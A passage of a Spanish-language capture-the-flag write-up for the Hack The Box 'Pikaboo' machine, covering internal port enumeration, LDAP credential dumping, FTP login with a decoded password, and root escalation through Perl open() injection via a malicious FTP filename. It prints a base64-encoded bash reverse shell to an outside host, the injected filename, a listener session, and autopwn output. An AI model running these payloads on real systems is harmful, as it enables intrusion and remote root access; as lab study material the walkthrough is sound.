+lrwxrwxrwx 1 root    root          9 Jul  6 20:01 .python_history -&gt; /dev/null
+-r--r----- 1 pwnmeow www-data     33 Aug 29 22:20 user.txt
+www-data@pikaboo:/var/www/html/admin_staging$ cat /home/pwnmeow/user.txt
+f3417b113fe715a58e02f9e29fe6c736
+</code></pre></div><p>Ahora podemos enumerar puertos internos y descubrir que el puerto 389 (LDAP) está abierto:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/var/www/html/admin_staging$ cd /
+www-data@pikaboo:/$ for i in $(seq 1 65535); do timeout 1 echo 2&gt;/dev/null &gt; /dev/tcp/127.0.0.1/$i &amp;&amp; echo &#34;Port $i open&#34;; done
+Port 21 open
+Port 22 open
+Port 80 open
+Port 81 open
+Port 389 open
+</code></pre></div><p>Una manera más sencilla de enuumerar puertos internos abiertos es con <code>netstat</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN
+tcp        1      0 127.0.0.1:81            127.0.0.1:49896         CLOSE_WAIT
+tcp        0      0 10.10.10.249:53456      10.10.16.113:4444       ESTABLISHED
+tcp        0      0 10.10.10.249:51604      10.10.15.128:4444       CLOSE_WAIT
+tcp        0    138 10.10.10.249:60272      10.10.17.44:4444        ESTABLISHED
+tcp        0      0 10.10.10.249:59558      10.10.14.29:1234        CLOSE_WAIT
+tcp        0      0 10.10.10.249:33250      10.10.14.217:4242       ESTABLISHED
+tcp6       0      0 :::80                   :::*                    LISTEN
+tcp6       0      0 :::21                   :::*                    LISTEN
+tcp6       0      0 :::22                   :::*                    LISTEN
+</code></pre></div><p>Vemos también que hay algunos archivos de Python en <code>/opt/pokeapi</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ ls -la /opt
+total 12
+drwxr-xr-x  3 root root 4096 May 20 07:17 .
+drwxr-xr-x 18 root root 4096 Jul 27 09:32 ..
+drwxr-xr-x 10 root root 4096 Jul  6 18:58 pokeapi
+www-data@pikaboo:/$ ls -la /opt/pokeapi/
+total 104
+drwxr-xr-x 10 root root 4096 Jul  6 18:58 .
+drwxr-xr-x  3 root root 4096 May 20 07:17 ..
+drwxr-xr-x  2 root root 4096 May 19 12:04 .circleci
+-rw-r--r--  1 root root  253 Jul  6 20:17 .dockerignore
+drwxr-xr-x  9 root root 4096 May 19 12:04 .git
+drwxr-xr-x  4 root root 4096 May 19 12:04 .github
+-rwxr-xr-x  1 root root  135 Jul  6 20:16 .gitignore
+-rw-r--r--  1 root root  100 Jul  6 20:16 .gitmodules
+-rw-r--r--  1 root root 3224 Jul  6 20:17 CODE_OF_CONDUCT.md
+-rw-r--r--  1 root root 3857 Jul  6 20:17 CONTRIBUTING.md
+-rwxr-xr-x  1 root root  184 Jul  6 20:17 CONTRIBUTORS.txt
+-rw-r--r--  1 root root 1621 Jul  6 20:16 LICENSE.md
+-rwxr-xr-x  1 root root 3548 Jul  6 20:16 Makefile
+-rwxr-xr-x  1 root root 7720 Jul  6 20:17 README.md
+drwxr-xr-x  6 root root 4096 May 19 12:04 Resources
+-rw-r--r--  1 root root    0 Jul  6 20:16 __init__.py
+-rw-r--r--  1 root root  201 Jul  6 20:17 apollo.config.js
+drwxr-xr-x  3 root root 4096 Jul  6 20:16 config
+drwxr-xr-x  4 root root 4096 May 19 12:14 data
+-rw-r--r--  1 root root 1802 Jul  6 20:16 docker-compose.yml
+drwxr-xr-x  4 root root 4096 May 19 12:04 graphql
+-rw-r--r--  1 root root  113 Jul  6 20:16 gunicorn.py.ini
+-rwxr-xr-x  1 root root  249 Jul  6 20:16 manage.py
+drwxr-xr-x  4 root root 4096 May 27 05:46 pokemon_v2
+-rw-r--r--  1 root root  375 Jul  6 20:16 requirements.txt
+-rw-r--r--  1 root root   86 Jul  6 20:16 test-requirements.txt
+</code></pre></div><p>Dentro del directorio <code>/opt/pokeapi/config</code> se encuentra un archivo <code>settings.py</code> con credenciales para LDAP:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ ls -la /opt/pokeapi/config/
+total 28
+-rwxr-xr-x  1 root root    0 Jul  6 20:17 __init__.py
+drwxr-xr-x  2 root root 4096 Jul  6 16:10 __pycache__
+-rw-r--r--  1 root root  783 Jul  6 20:17 docker-compose.py
+-rwxr-xr-x  1 root root  548 Jul  6 20:17 docker.py
+-rwxr-xr-x  1 root root  314 Jul  6 20:17 local.py
+-rwxr-xr-x  1 root root 3080 Jul  6 20:17 settings.py
+-rwxr-xr-x  1 root root  181 Jul  6 20:17 urls.py
+-rwxr-xr-x  1 root root 1408 Jul  6 20:17 wsgi.py
+www-data@pikaboo:/$ cat /opt/pokeapi/config/settings.py
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=color:#75715e># ...</span>
+DATABASES <span style=color:#f92672>=</span> {
+    <span style=color:#e6db74>&#34;ldap&#34;</span>: {
+        <span style=color:#e6db74>&#34;ENGINE&#34;</span>: <span style=color:#e6db74>&#34;ldapdb.backends.ldap&#34;</span>,
+        <span style=color:#e6db74>&#34;NAME&#34;</span>: <span style=color:#e6db74>&#34;ldap:///&#34;</span>,
+        <span style=color:#e6db74>&#34;USER&#34;</span>: <span style=color:#e6db74>&#34;cn=binduser,ou=users,dc=pikaboo,dc=htb&#34;</span>,
+        <span style=color:#e6db74>&#34;PASSWORD&#34;</span>: <span style=color:#e6db74>&#34;J~42%W?PFHl]g&#34;</span>,
+    },
+    <span style=color:#e6db74>&#34;default&#34;</span>: {
+        <span style=color:#e6db74>&#34;ENGINE&#34;</span>: <span style=color:#e6db74>&#34;django.db.backends.sqlite3&#34;</span>,
+        <span style=color:#e6db74>&#34;NAME&#34;</span>: <span style=color:#e6db74>&#34;/opt/pokeapi/db.sqlite3&#34;</span>,
+    }
+}
+<span style=color:#75715e># ...</span>
+</code></pre></div><h2 id=enumeración-por-ldap>Enumeración por LDAP</h2>
+<p>Después de buscar información sobre LDAP y <code>ldapsearch</code> (por ejemplo, <a href=https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/>aquí</a>), vemos algunos comandos útiles.</p>
+<p>En el comando <code>ldapsearch</code> hay que especificar <code>cn=binduser,ou=users,dc=pikaboo,dc=htb</code> como <em>bind</em> DN (<em>Distinguished Name</em>) y <code>dc=pikaboo,dc=htb</code> como <em>base</em> DN para realizar la búsqueda:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext>www-data@pikaboo:/$ ldapsearch -xD &#39;cn=binduser,ou=users,dc=pikaboo,dc=htb&#39; -w &#39;J~42%W?PFHl]g&#39; -b &#39;dc=pikaboo,dc=htb&#39;
+# extended LDIF
+#
+# LDAPv3
+# base &lt;dc=pikaboo,dc=htb&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# pikaboo.htb
+dn: dc=pikaboo,dc=htb
+objectClass: domain
+dc: pikaboo
+
+# ftp.pikaboo.htb
+dn: dc=ftp,dc=pikaboo,dc=htb
+objectClass: domain
+dc: ftp
+
+# users, pikaboo.htb
+dn: ou=users,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+# pokeapi.pikaboo.htb
+dn: dc=pokeapi,dc=pikaboo,dc=htb
+objectClass: domain
+dc: pokeapi
+
+# users, ftp.pikaboo.htb
+dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+# groups, ftp.pikaboo.htb
+dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: groups
+
+# pwnmeow, users, ftp.pikaboo.htb
+dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+uid: pwnmeow
+cn: Pwn
+sn: Meow
+loginShell: /bin/bash
+uidNumber: 10000
+gidNumber: 10000
+homeDirectory: /home/pwnmeow
+userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
+
+# binduser, users, pikaboo.htb
+dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
+cn: binduser
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+userPassword:: Sn40MiVXP1BGSGxdZw==
+
+# users, pokeapi.pikaboo.htb
+dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+# groups, pokeapi.pikaboo.htb
+dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: groups
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 11
+# numEntries: 10
+</code></pre></div><p>Podemos ver qué permisos tiene <code>pwnmeow</code> sobre FTP. Veamos esta información añadiendo <code>dc=ftp</code> al <em>base</em> DN para obtener resultados más concretos:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext>www-data@pikaboo:/$ ldapsearch -xD &#39;cn=binduser,ou=users,dc=pikaboo,dc=htb&#39; -w &#39;J~42%W?PFHl]g&#39; -b &#39;dc=ftp,dc=pikaboo,dc=htb&#39;
+# extended LDIF
+#
+# LDAPv3
+# base &lt;dc=ftp,dc=pikaboo,dc=htb&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# ftp.10.10.10.249
+dn: dc=ftp,dc=pikaboo,dc=htb
+objectClass: domain
+dc: ftp
+
+# users, ftp.10.10.10.249
+dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+# groups, ftp.10.10.10.249
+dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: groups
+
+# pwnmeow, users, ftp.10.10.10.249
+dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+uid: pwnmeow
+cn: Pwn
+sn: Meow
+loginShell: /bin/bash
+uidNumber: 10000
+gidNumber: 10000
+homeDirectory: /home/pwnmeow
+userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 5
+# numEntries: 4
+</code></pre></div><p>Ahora podemos conectarnos por FTP como <code>pwnmeow</code> utilizando la siguiente contraseña:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ echo X0cwdFQ0X0M0dGNIXyczbV80bEwhXw<span style=color:#f92672>==</span> | base64 -d
+_G0tT4_C4tcH_&#39;3m_4lL!_
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ftp pwnmeow@10.10.10.249
+Connected to 10.10.10.249.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password:
+230 Login successful.
+</code></pre></div><h2 id=encontrando-una-tarea-cron>Encontrando una tarea Cron</h2>
+<p>Tras esto, podemos verificar que <code>pwnmeow</code> está en el grupo <code>ftp</code> y listar archivos que pertenecen a este grupo:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ cat /etc/group | grep pwnmeow
+pwnmeow:x:1000:pwnmeow
+ftp:x:115:pwnmeow
+www-data@pikaboo:/$ find / -group ftp 2&gt;/dev/null
+/srv/ftp
+/srv/ftp/growth_rate_prose
+/srv/ftp/ability_changelog_prose
+/srv/ftp/types
+/srv/ftp/item_names
+/srv/ftp/language_names
+...
+</code></pre></div><p>Por otro lado, podemos listar más <em>scripts</em> de Python como se muestra:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ find / -name *.py 2&gt;/dev/null | grep -vE &#39;python|share&#39;
+/usr/local/bin/django-admin.py
+/opt/pokeapi/__init__.py
+/opt/pokeapi/manage.py
+/opt/pokeapi/data/__init__.py
+/opt/pokeapi/data/v2/__init__.py
+/opt/pokeapi/data/v2/build.py
+/opt/pokeapi/config/wsgi.py
+/opt/pokeapi/config/local.py
+/opt/pokeapi/config/__init__.py
+/opt/pokeapi/config/docker.py
+/opt/pokeapi/config/settings.py
+/opt/pokeapi/config/urls.py
+/opt/pokeapi/config/docker-compose.py
+/opt/pokeapi/pokemon_v2/__init__.py
+/opt/pokeapi/pokemon_v2/migrations/0006_auto_20200725_2205.py
+/opt/pokeapi/pokemon_v2/migrations/__init__.py
+/opt/pokeapi/pokemon_v2/migrations/0001_squashed_0002_auto_20160301_1408.py
+/opt/pokeapi/pokemon_v2/migrations/0009_pokemontypepast.py
+/opt/pokeapi/pokemon_v2/migrations/0005_auto_20200709_1930.py
+/opt/pokeapi/pokemon_v2/migrations/0002_itemsprites_pokemonformsprites_pokemonsprites.py
+/opt/pokeapi/pokemon_v2/migrations/0007_auto_20200815_0610.py
+/opt/pokeapi/pokemon_v2/migrations/0008_auto_20201123_2045.py
+/opt/pokeapi/pokemon_v2/migrations/0004_iso639length_20191217.py
+/opt/pokeapi/pokemon_v2/migrations/0003_auto_20160530_1132.py
+/opt/pokeapi/pokemon_v2/migrations/0010_pokemonformtype.py
+/opt/pokeapi/pokemon_v2/urls.py
+/opt/pokeapi/pokemon_v2/test_models.py
+/opt/pokeapi/pokemon_v2/serializers.py
+/opt/pokeapi/pokemon_v2/models.py
+/opt/pokeapi/pokemon_v2/tests.py
+/opt/pokeapi/pokemon_v2/api.py
+</code></pre></div><p>Existe un archivo en <code>/usr/local/bin/django-admin.py</code>. De hecho, en este directorio hay un <em>script</em> para una tarea Cron:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ ls -l /usr/local/bin
+total 44
+drwxr-xr-x  2 root root 4096 Jul  6 18:57 __pycache__
+-rwxr-xr-x  1 root root  218 May 19 12:07 coverage
+-rwxr-xr-x  1 root root  218 May 19 12:07 coverage-3.7
+-rwxr-xr-x  1 root root  218 May 19 12:07 coverage3
+-rwxr--r--  1 root root 6444 Jun  1 10:55 csvupdate
+-rwxr--r--  1 root root  116 Jun  1 09:40 csvupdate_cron
+-rwxr-xr-x  1 root root  266 Jul  6 18:57 django-admin
+-rwxr-xr-x  1 root root  125 Jul  6 18:57 django-admin.py
+-rwxr-xr-x  1 root root  220 May 19 12:07 gunicorn
+-rwxr-xr-x  1 root root  219 Jul  6 18:55 sqlformat
+www-data@pikaboo:/tmp$ cat /usr/local/bin/csvupdate_cron
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>for</span> d in /srv/ftp/*
+<span style=color:#66d9ef>do</span>
+  cd $d
+  /usr/local/bin/csvupdate <span style=color:#66d9ef>$(</span>basename $d<span style=color:#66d9ef>)</span> *csv
+  /usr/bin/rm -rf *
+<span style=color:#66d9ef>done</span>
+</code></pre></div><p>Esta tarea Cron está ejecutando <code>csvupdate</code>, que es un <em>script</em> escrito en Perl:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>root@pikaboo:/srv/ftp/abilities# cat /usr/local/bin/csvupdate
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-perl data-lang=perl><span style=color:#75715e>#!/usr/bin/perl</span>
+
+<span style=color:#75715e>##################################################################</span>
+<span style=color:#75715e># Script for upgrading PokeAPI CSV files with FTP-uploaded data. #</span>
+<span style=color:#75715e>#                                                                #</span>
+<span style=color:#75715e># Usage:                                                         #</span>
+<span style=color:#75715e># ./csvupdate &lt;type&gt; &lt;file(s)&gt;                                   #</span>
+<span style=color:#75715e>#                                                                #</span>
+<span style=color:#75715e># Arguments:                                                     #</span>
+<span style=color:#75715e># - type: PokeAPI CSV file type                                  #</span>
+<span style=color:#75715e>#         (must have the correct number of fields)               #</span>
+<span style=color:#75715e># - file(s): list of files containing CSV data                   #</span>
+<span style=color:#75715e>##################################################################</span>
+
+<span style=color:#66d9ef>use</span> strict;
+<span style=color:#66d9ef>use</span> warnings;
+<span style=color:#66d9ef>use</span> Text::CSV;
+
+<span style=color:#66d9ef>my</span> $csv_dir <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/opt/pokeapi/data/v2/csv&#34;</span>;
+
+<span style=color:#66d9ef>my</span> %csv_fields <span style=color:#f92672>=</span> (
+  <span style=color:#e6db74>&#39;abilities&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>4</span>,
+  <span style=color:#e6db74>&#39;ability_changelog&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>,
+  <span style=color:#e6db74>&#39;ability_changelog_prose&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>,
+  <span style=color:#e6db74>&#39;ability_flavor_text&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>4</span>,
+  <span style=color:#e6db74>&#39;ability_names&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>,
+  <span style=color:#e6db74>&#39;ability_prose&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>4</span>,
+  <span style=color:#75715e># ...</span>
+  <span style=color:#e6db74>&#39;version_group_pokemon_move_methods&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>2</span>,
+  <span style=color:#e6db74>&#39;version_group_regions&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>2</span>,
+  <span style=color:#e6db74>&#39;version_groups&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>4</span>,
+  <span style=color:#e6db74>&#39;version_names&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>,
+  <span style=color:#e6db74>&#39;versions&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>
+);
+
+
+<span style=color:#66d9ef>if</span>($#ARGV <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span>)
+{
+  die <span style=color:#e6db74>&#34;Usage: $0 &lt;type&gt; &lt;file(s)&gt;\n&#34;</span>;
+}
+
+<span style=color:#66d9ef>my</span> $type <span style=color:#f92672>=</span> $ARGV[<span style=color:#ae81ff>0</span>];
+<span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>exists $csv_fields{$type})
+{
+  die <span style=color:#e6db74>&#34;Unrecognised CSV data type: $type.\n&#34;</span>;
+}
+
+<span style=color:#66d9ef>my</span> $csv <span style=color:#f92672>=</span> Text::CSV<span style=color:#f92672>-&gt;</span><span style=color:#66d9ef>new</span>({ sep_char <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;,&#39;</span> });
+
+<span style=color:#66d9ef>my</span> $fname <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;${csv_dir}/${type}.csv&#34;</span>;
+open(<span style=color:#66d9ef>my</span> $fh, <span style=color:#e6db74>&#34;&gt;&gt;&#34;</span>, $fname) <span style=color:#f92672>or</span> die <span style=color:#e6db74>&#34;Unable to open CSV target file.\n&#34;</span>;
+
+shift;
+<span style=color:#66d9ef>for</span>(<span style=color:#f92672>&lt;&gt;</span>)
+{
+  chomp;
+  <span style=color:#66d9ef>if</span>($csv<span style=color:#f92672>-&gt;</span>parse($_))
+  {
+    <span style=color:#66d9ef>my</span> @fields <span style=color:#f92672>=</span> $csv<span style=color:#f92672>-&gt;</span>fields();
+    <span style=color:#66d9ef>if</span>(@fields <span style=color:#f92672>!=</span> $csv_fields{$type})
+    {
+      warn <span style=color:#e6db74>&#34;Incorrect number of fields: &#39;$_&#39;\n&#34;</span>;
+      <span style=color:#66d9ef>next</span>;
+    }
+    <span style=color:#66d9ef>print</span> $fh <span style=color:#e6db74>&#34;$_\n&#34;</span>;
+  }
+}
+
+close($fh);
+</code></pre></div><h2 id=explotando-una-inyección-de-comandos>Explotando una inyección de comandos</h2>
+<p>Este <em>script</em> <code>csvupdate_cron</code> es vulnerable a inyección de comandos porque utiliza un <em>wildcard</em> en el archivo CSV. Para explotar la vulnerabilidad, la idea es almacenar un archivo con un nombre malicioso que contenga un comando de sistema.</p>
+<p>El archivo malicioso debe guardarse en un directorio de <code>/srv/ftp</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/ ls -la /srv/ftp
+total 712
+drwxr-xr-x 176 root ftp  12288 May 20  2021 .
+drwxr-xr-x   3 root root  4096 May 10  2021 ..
+drwx-wx---   2 root ftp   4096 Dec  4 14:20 abilities
+drwx-wx---   2 root ftp   4096 May 20  2021 ability_changelog
+drwx-wx---   2 root ftp   4096 May 20  2021 ability_changelog_prose
+drwx-wx---   2 root ftp   4096 May 20  2021 ability_flavor_text
+drwx-wx---   2 root ftp   4096 May 20  2021 ability_names
+drwx-wx---   2 root ftp   4096 May 20  2021 ability_prose
+...
+drwx-wx---   2 root ftp   4096 May 20  2021 version_group_pokemon_move_methods
+drwx-wx---   2 root ftp   4096 May 20  2021 version_group_regions
+drwx-wx---   2 root ftp   4096 May 20  2021 version_groups
+drwx-wx---   2 root ftp   4096 May 20  2021 version_names
+drwx-wx---   2 root ftp   4096 May 20  2021 versions
+</code></pre></div><p>Podemos utilizar <code>versions</code>, por ejemplo. Entonces, podremos subir el archivo malicioso con el nombre especial y obtener una <em>reverse shell</em> como <code>root</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ echo -n <span style=color:#e6db74>&#39;bash  -i &gt;&amp; /dev/tcp/10.10.17.44/4444 0&gt;&amp;1&#39;</span> | base64 
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+</code></pre></div><p>Ahora debemos subir el archivo y nombrarlo con el comando inyectado de manera remota:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ touch file
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>$ ftp pwnmeow@10.10.10.249
+Connected to 10.10.10.249.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password:
+230 Login successful.
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwx-wx---    2 ftp      ftp          4096 May 20 09:54 abilities
+drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_changelog
+...
+drwx-wx---    2 ftp      ftp          4096 May 20 08:01 version_names
+drwx-wx---    2 ftp      ftp          4096 Sep 12 22:29 versions
+226 Directory send OK.
+ftp&gt; cd versions
+250 Directory successfully changed.
+ftp&gt; put
+(local-file) file
+(remote-file) &#34;|echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash|.csv&#34;
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+</code></pre></div><p>Como se muestra, el nombre del archivo está construido de tal forma que el comando ejecutado por la tarea Cron es:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>/usr/local/bin/csvupdate $(basename $d) |echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash|.csv
+</code></pre></div><p>El uso de <em>pipes</em> (<code>|</code>) se debe a que fue la única manera de ejecutar comandos correctamente. Antes, se utilizaron varios punto y coma y sentencias OR, pero ninguna funcionó.</p>
+<p>Y la razón por la que este tipo de inyección de comandos funcionó es por un comportamiento extraño de Perl (se conoce como: inyección de argumentos abiertos en Perl, más información <a href=https://perl-begin.org/topics/security/code-markup-injection/>aquí</a>).</p>
+<p>Y finalmente, obtenemos acceso como <code>root</code> y podemos leer la <em>flag</em> <code>root.txt</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc -nlvp <span style=color:#ae81ff>4444</span>
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.249.
+Ncat: Connection from 10.10.10.249:47382.
+bash: cannot set terminal process group (7636): Inappropriate ioctl for device
+bash: no job control in this shell
+root@pikaboo:/srv/ftp/versions# cat /root/root.txt
+3904cd5b02fd88be5264107d52282460
+</code></pre></div><p>Como añadido, todos los pasos necesarios para comprometer la máquina se han programado en un <em>script</em> en Python llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Pikaboo/autopwn.py><code>autopwn.py</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Pikaboo#autopwnpy>aquí</a>):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 autopwn.py 10.10.17.44
+[*] FTP log (/var/log/vsftpd.log) has been poisoned
+[+] Trying to bind to :: on port 4444: Done
+[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47390
+[*] Found user: pwnmeow
+[!] Found user.txt: f3417b113fe715a58e02f9e29fe6c736
+[*] Found LDAP user: cn=binduser,ou=users,dc=pikaboo,dc=htb
+[*] Found LDAP password: J~42%W?PFHl]g
+[*] Found FTP password: _G0tT4_C4tcH_&#39;3m_4lL!_
+[*] Stored malicious file with injected command in filename
+[+] Trying to bind to :: on port 4444: Done
+[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47396
+[!] Found root.txt: 3904cd5b02fd88be5264107d52282460
+[+] Got shell as root
+[*] Switching to interactive mode
+root@pikaboo:/srv/ftp/abilities#
+</code></pre></div><div class="mt6 instapaper_ignoref">
+</div>
+</div>
+<aside aria-label=aside class="w-20-l mt6-l aside-desktop">
+<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
+<p class="f5 b mb3">Contenidos de este write-up</p>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#port-scanning>Port scanning</a></li>
+<li><a href=#enumeración-web>Enumeración web</a></li>
+<li><a href=#realizando-navegación-de-directorios>Realizando navegación de directorios</a></li>
+<li><a href=#encontrando-un-lfi>Encontrando un LFI</a></li>
+<li><a href=#envenenamiento-del-_log_-de-ftp>Envenenamiento del <em>log</em> de FTP</a></li>
+<li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li>
+<li><a href=#enumeración-por-ldap>Enumeración por LDAP</a></li>
+<li><a href=#encontrando-una-tarea-cron>Encontrando una tarea Cron</a></li>
+<li><a href=#explotando-una-inyección-de-comandos>Explotando una inyección de comandos</a></li>
+</ul>
+</nav>
+</div>
+</aside>
+</article>
+</main>
+<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
+<div class="flex justify-between">
+<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/>&copy; 7Rocky 2021</a>
+<div style=margin-top:8px>
+<div>
+<div>
